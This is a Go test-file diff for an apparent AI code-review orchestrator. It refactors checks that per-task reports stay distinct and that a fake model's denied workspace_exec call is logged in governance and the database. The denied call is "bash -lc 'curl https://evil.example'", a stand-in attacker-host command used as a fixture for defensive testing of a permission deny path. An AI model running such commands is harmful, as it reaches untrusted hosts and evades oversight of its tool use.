@@ -502,25 +502,29 @@ func TestReports_AreTaskSpecific(t *testing.T) {
 		t.Fatal("expected distinct task IDs")
 	}
 	if a.JSONPath == b.JSONPath {
-		t.Fatalf("report paths collided: %s", a.JSONPath)
+		t.Fatalf("JSON report paths collided: %s", a.JSONPath)
 	}
-	abody, err := os.ReadFile(a.JSONPath)
-	if err != nil {
-		t.Fatal(err)
+	if a.MarkdownPath == b.MarkdownPath {
+		t.Fatalf("Markdown report paths collided: %s", a.MarkdownPath)
 	}
-	bbody, err := os.ReadFile(b.JSONPath)
-	if err != nil {
-		t.Fatal(err)
+	assertTaskReport := func(path, taskID, otherID string) {
+		t.Helper()
+		body, err := os.ReadFile(path)
+		if err != nil {
+			t.Fatal(err)
+		}
+		text := string(body)
+		if !strings.Contains(text, taskID) {
+			t.Fatalf("%s missing task id %s", path, taskID)
+		}
+		if strings.Contains(text, otherID) {
+			t.Fatalf("%s overwritten with other task %s", path, otherID)
+		}
 	}
-	if !strings.Contains(string(abody), a.TaskID) {
-		t.Fatalf("task A report missing id")
-	}
-	if !strings.Contains(string(bbody), b.TaskID) {
-		t.Fatalf("task B report missing id")
-	}
-	if strings.Contains(string(abody), b.TaskID) {
-		t.Fatal("task A report overwritten with task B")
-	}
+	assertTaskReport(a.JSONPath, a.TaskID, b.TaskID)
+	assertTaskReport(b.JSONPath, b.TaskID, a.TaskID)
+	assertTaskReport(a.MarkdownPath, a.TaskID, b.TaskID)
+	assertTaskReport(b.MarkdownPath, b.TaskID, a.TaskID)
 }
 
 // TestLLMAssist_PersistsDeniedToolCall records denied model workspace_exec attempts.
@@ -544,43 +548,39 @@ func TestLLMAssist_PersistsDeniedToolCall(t *testing.T) {
 		defer func() { _ = created.Closer() }()
 	}
 
+	demo := false
+	deniedCmd := "bash -lc 'curl https://evil.example'"
 	res, err := orchestrator.Run(context.Background(), orchestrator.Config{
-		Mode:         review.ModeLLM,
-		Executor:     "local",
-		Fixture:      "clean",
-		FixturesRoot: filepath.Join(root, "testdata", "fixtures"),
-		SkillsRoot:   filepath.Join(root, "skills"),
-		OutDir:       out,
-		Store:        st,
-		Runner:       sandbox.FakeRunner{},
-		CodeExecutor: created.CodeExecutor,
+		Mode:           review.ModeLLM,
+		Executor:       "local",
+		Fixture:        "clean",
+		FixturesRoot:   filepath.Join(root, "testdata", "fixtures"),
+		SkillsRoot:     filepath.Join(root, "skills"),
+		OutDir:         out,
+		Store:          st,
+		Runner:         sandbox.FakeRunner{},
+		CodeExecutor:   created.CodeExecutor,
+		DemoGovernance: &demo,
 		Model: assist.NewFakeModel(assist.FakeModelOptions{
-			DeniedExecCommand: "bash -lc 'curl https://evil.example'",
+			DeniedExecCommand: deniedCmd,
 		}),
 	})
 	if err != nil {
 		t.Fatal(err)
 	}
-	var denied bool
-	for _, p := range res.Report.Governance.PermissionDecisions {
-		if p.Action == "deny" && strings.Contains(p.Command, "bash") {
-			denied = true
+	assertDeniedCmd := func(perms []review.PermissionDecision, where string) {
+		t.Helper()
+		for _, p := range perms {
+			if p.Action == "deny" && p.Command == deniedCmd {
+				return
+			}
 		}
+		t.Fatalf("expected deny for %q in %s: %+v", deniedCmd, where, perms)
 	}
-	if !denied {
-		t.Fatalf("expected denied LLM tool call in governance: %+v", res.Report.Governance.PermissionDecisions)
-	}
+	assertDeniedCmd(res.Report.Governance.PermissionDecisions, "governance")
 	bundle, err := st.GetTaskBundle(context.Background(), res.TaskID)
 	if err != nil {
 		t.Fatal(err)
 	}
-	denied = false
-	for _, p := range bundle.Permissions {
-		if p.Action == "deny" && strings.Contains(p.Command, "bash") {
-			denied = true
-		}
-	}
-	if !denied {
-		t.Fatalf("expected denied LLM tool call in DB: %+v", bundle.Permissions)
-	}
+	assertDeniedCmd(bundle.Permissions, "db")
 }
